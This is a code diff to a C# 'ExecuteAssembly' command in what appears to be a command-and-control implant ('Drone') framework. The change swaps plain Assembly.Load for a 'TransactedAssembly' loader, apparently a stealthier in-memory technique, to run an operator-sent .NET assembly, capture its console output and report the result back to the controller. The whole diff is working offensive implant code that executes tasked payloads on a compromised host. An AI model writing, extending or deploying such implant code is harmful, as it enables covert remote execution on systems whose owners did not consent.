@@ -1,6 +1,5 @@
 ﻿using System;
 using System.IO;
-using System.Reflection;
 using System.Threading;
 using System.Threading.Tasks;
 
@@ -23,17 +22,27 @@ public sealed class ExecuteAssembly : DroneCommand
         Console.SetOut(sw);
         Console.SetError(sw);
 
-        var t = new Thread(() =>
+        Thread t = null;
+        t = new Thread(RunAssembly);
+        t.Start();
+
+        async void RunAssembly()
         {
             // load and run assembly
-            var asm = Assembly.Load(task.Artefact);
-            
+            using var transactAsm = new TransactedAssembly();
+            var asm = transactAsm.Load(task.Artefact);
+
+            if (asm is null)
+            {
+                await Drone.SendTaskError(task.Id, "Failed to load assembly");
+                t?.Abort();
+                return;
+            }
+
             // this will block
-            asm.EntryPoint.Invoke(null, new object[] { task.Arguments });
-        });
-        
-        t.Start();
-        
+            asm.EntryPoint?.Invoke(null, new object[] { task.Arguments });
+        }
+
         // send a task running
         await Drone.SendTaskRunning(task.Id);
 
@@ -66,8 +75,16 @@ public sealed class ExecuteAssembly : DroneCommand
         // restore console
         Console.SetOut(stdOut);
         Console.SetError(stdErr);
-        
-        await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, output));
+
+        if (t.ThreadState is ThreadState.Stopped or ThreadState.Aborted)
+        {
+            if (output.Length > 0)
+                await Drone.SendTaskOutput(new TaskOutput(task.Id, TaskStatus.COMPLETE, output));
+            
+            return;
+        }
+
+        await Drone.SendTaskComplete(task.Id);
     }
 
     private static byte[] ReadStream(MemoryStream ms)
